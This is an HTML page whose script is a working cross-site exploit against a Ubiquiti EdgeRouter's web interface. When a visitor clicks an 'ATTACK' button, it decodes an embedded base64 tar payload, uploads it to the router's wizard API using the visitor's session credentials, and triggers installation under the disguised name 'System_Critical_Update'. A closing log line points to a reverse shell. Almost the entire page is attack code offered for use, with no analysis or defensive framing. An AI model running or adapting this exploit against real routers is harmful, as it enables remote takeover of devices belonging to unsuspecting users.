<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="referrer" content="no-referrer">
    <title>Router RCE Final</title>
</head>
<body>
    <h1>Ubiquiti EdgeRouter RCE (Smart Mode)</h1>
    <button onclick="runExploit()">⚡ ATTACK ⚡</button>
    <div id="log" style="white-space: pre-wrap; font-family: monospace; color: green; background: #eee; padding: 10px;"></div>

    <script>
        var target = "https://192.168.1.1";

        function log(msg) {
            document.getElementById("log").innerText += "\n" + msg;
            console.log(msg);
        }

        function runExploit() {
            // 1. 构造 Payload
            var b64Data = "H4sICCx1MmkC/2V4cGxvaXQudGFyAO3VQU/CMBjG8Z75FDWeXft23ZolaDyIgYNICIlHUrclm7LNjIJE43eX6UGjAU/MAM/v0qVb0kvf/T3hicuRXfVTm6Q12wn5adMqpa++npt9kook4yvWgsXc2Xp9PDtOKuSFy4v0nEyoI9LahF7kBxR1GByB5/zF1slZvSh3d0Yz1KHWzUomkN/XD0SaUUDN5VM6CNbzr8gnxmWb8x/bWbXt//fX+z11eiLu81LMs46rFnHGhSuexOhu2LuaXo9vb6aD4aQ3HvYmnTgrqoQbYzZ/gmnaPx76j/6j/0fefy9zxezf+i/9X/1Xxkf/29DN6KJv48c04cvc8kHp0rpMXVes9zEd6D/6j/7D4VraWZ5YV9Xew7wqdzf/W/sv1c/+m1Ci/214fcMMAAAAAAAAAAAcsncEDx/KACgAAA==";
            var byteCharacters = atob(b64Data);
            var byteNumbers = new Array(byteCharacters.length);
            for (var i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            var blob = new Blob([new Uint8Array(byteNumbers)], { type: "application/x-gzip" });

            // 2. 上传并读取回显
            var formData = new FormData();
            formData.append("qqfile", blob, "exploit.tar.gz");

            var xhr = new XMLHttpRequest();
            xhr.open("POST", target + "/api/wizard/upload.json", true);
            xhr.withCredentials = true;

            log("[*] Step 1: Uploading payload...");

            xhr.onload = function () {
                if (xhr.status === 200) {
                    try {
                        log("[+] Upload Success! Response: " + xhr.responseText);
                        // 解析真实的随机路径
                        var resp = JSON.parse(xhr.responseText);
                        
                        // 这里的字段名可能是 'path' 或者 'file'，根据回显自动判断
                        // 之前你没看到回显，现在能看到了
                        var realPath = resp.path || resp.file || resp.url;
                        
                        if (realPath) {
                            log("[!] Target confirmed at: " + realPath);
                            triggerInstall(realPath);
                        } else {
                            log("[-] JSON parsed but no path found. Response structure unknown.");
                        }
                    } catch (e) {
                        log("[-] Error parsing JSON: " + e);
                    }
                } else {
                    log("[-] Upload failed. Status: " + xhr.status);
                }
            };
            xhr.send(formData);
        }

        function triggerInstall(path) {
            log("[*] Step 2: Executing payload at " + path + " ...");
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", target + "/api/wizard/create.json", true);
            xhr2.withCredentials = true;
            var fd = new FormData();
            fd.append("name", "System_Critical_Update");
            fd.append("path", path); // 使用刚才获取的真实路径

            xhr2.onload = function () {
                log("[+] Exploit triggered! Status: " + xhr2.status);
                log("[+] Check your reverse shell/router file system now.");
            };
            xhr2.send(fd);
        }
    </script>
</body>
</html>
